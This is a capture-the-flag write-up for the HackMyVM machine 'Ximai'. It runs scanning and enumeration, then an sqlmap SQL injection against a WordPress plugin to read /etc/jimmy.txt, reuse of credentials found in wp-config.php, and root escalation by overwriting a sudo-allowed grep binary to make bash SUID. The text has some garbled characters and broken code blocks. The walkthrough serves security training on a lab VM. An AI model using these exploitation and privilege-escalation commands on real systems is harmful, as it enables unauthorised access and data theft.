# üñ•Ô∏è Writeup - Ximai 

**Platform:** HackMyVM  
**Operating System:** Linux  

# INSTALLATION

We download the `zip` containing the `.ova` of the Ximai machine, extract it, and import it into VirtualBox.

We configure the network interface of the Ximai machine and run it alongside the attacker machine.

# HOST DISCOVERY

At this point, we still don‚Äôt know which `IP` address is assigned to Ximai, so we discover it as follows:

```bash
netdiscover -i eth1 -r 10.0.0.0/16
```
Info:
```

 10.0.4.26       08:00:27:ab:56:1b      1      60  PCS Systemtechnik GmbH
 ```

 We identify with high confidence that the victim‚Äôs IP is `10.0.4.26`.

 # PORT SCANNING

Next, we perform a general scan to check which ports are open, followed by a more exhaustive scan to gather relevant service information.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 10.0.4.26
``` 

```bash
nmap -n -Pn -sCV -p22,80,3306,8000 --min-rate 5000 10.0.4.26
```

```


The scan revealed the following open ports: `22`, `80`, `3306`, and `8000`.

We access port `80` and find the default Apache landing page.

# GOBUSTER

Next, we perform directory `fuzzing` to discover hidden paths and files.

```bash
gobuster dir -u http://10.0.4.26 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,zip,php,txt,bak,sh -b 403,404 -t 60
```

Progress: 1183407 / 1543899 (76.65%)
```

We discover two hidden files; one is `info.php`, which could reveal server configuration, but for now we focus on `reminder.php`.

![alt text](../../images/ximai.png)

We open `reminder.php` and see a page that states someone left a `.txt` file containing Jimmy‚Äôs credentials, but the page does not reveal its location.

We inspect the page source: 

```
<p class="hint-text">
            jimmy! Don't forget we need to harden the security on the web server. In case you have forgotten your access details, I've put them in a txt file for you. It's in that place where I put that thing that time.
        </p>

        <img src="that-place-where-i-put-that-thing-that-time/1b260614-3aff-11f0-ac81-000c2921b441.jpg" alt="Mysterious Image">
```

We find that the cat image path is very suspicious and matches the directory referenced as containing the credentials.
Next, we attempt to navigate manually to likely filenames such as `credentials.txt`, `creds.txt`, or `access.txt`.

We eventually find a match: 

![alt text](../../images/ximai2.png)

There is a `symlink` pointing to `/etc/jimmy.txt`, and we cannot read the file.

We cannot progress further here, so we inspect the `WordPress` instance running on port `8000`.

There, we find a message indicating `MySQL` allows local file access, suggesting the database could be abused to read local files, potentially via one of the installed WordPress `plugins`.

# WPSCAN

We use `wpscan` to enumerate `users` and `plugins`, passing an `API token` so it reports known vulnerabilities.

```bash
wpscan --url http://10.0.4.26:8000 --api-token "srCmCxxxxxxxxuzYle5k" --enumerate p
```

Info:
```

    Found By: Readme - Stable Tag (Aggressive Detection)
     - http://192.168.3.166:8000/wp-content/plugins/depicter/readme.txt
```

We find an `SQLi` vulnerability in one of the `plugins` and an `adminer` user account.

Next, we search Exploit-DB for a `PoC` related to the `CVE`.

After some trial and error using information from Exploit-DB, we craft a `sqlmap` command and run it against the vulnerable endpoint.

```bash
sqlmap -u "http://10.0.4.26:8000/wp-admin/admin-ajax.php?s=test&action=depicter-lead-index" -p s --sql-query "SELECT LOAD_FILE('/etc/jimmy.txt')" --batch
```

```

In the `sqlmap` output we read the contents of `/etc/jimmy.txt` : `HandsomeHU`.

That is most likely the `password` for the user `jimmy`.

Next, we log in via `SSH`.

# PRIVLEGE ESCALATION

Inside, when we attempt to run commands like `ls` or `sudo -l`, we see the following message:

```
sorry, you are restricted from using this command.
```
After a few minutes with no clear direction, we check the `$PATH`:

```
jimmy@Ximai:~$ echo $PATH
./...
```

The `$PATH` is clearly misconfigured, and fixing it likely resolves the command execution issues.

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

After correcting the environment, we can execute commands normally.

In Jimmy‚Äôs home directory we find the `user flag`.

```
flag{user-ffbea0a7-3b01-11f0-9160-000c2921b441}
``` 

Next, we continue enumeration and locate `wp-config.php` in `/var/www/wordpress/`.

We read `wp-config.php` and find the following:

```
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the website, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/
 *
 * @package WordPress
 *
 * adminer:adminer123456
 */
```

We find a comment in `wp-config.php` containing the credentials for the user `adminer`  that we discovered earlier with `wpscan`. 

Naturally, we test those credentials and log in.

```
su adminer
```

Info:
```
adminer@Ximai:/var/www/wordpress$ whoami
adminer
```

We check `sudo` privileges and `SUID` binaries for the user `adminer`.

```bash
sudo -l
```

Info:
```
Matching Defaults entries for adminer on Ximai:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User adminer may run the following commands on Ximai:
    (ALL) NOPASSWD: /usr/bin/grep
```

We discover that the `grep` binary is executable with `root` privileges. We leverage this to escalate privileges to `root`.

```bash
echo "chmod u+s /bin/bash" > /usr/bin/grep
sudo /usr/bin/grep
/bin/bash -p
```

Info:
```
bash-5.0# whoami
root
bash-5.0#
```

We are `root`!

In the `/root` directory, we find the `root flag`.

```
flag{root-126e5653-3b02-11f0-b074-000c2921b441}
```
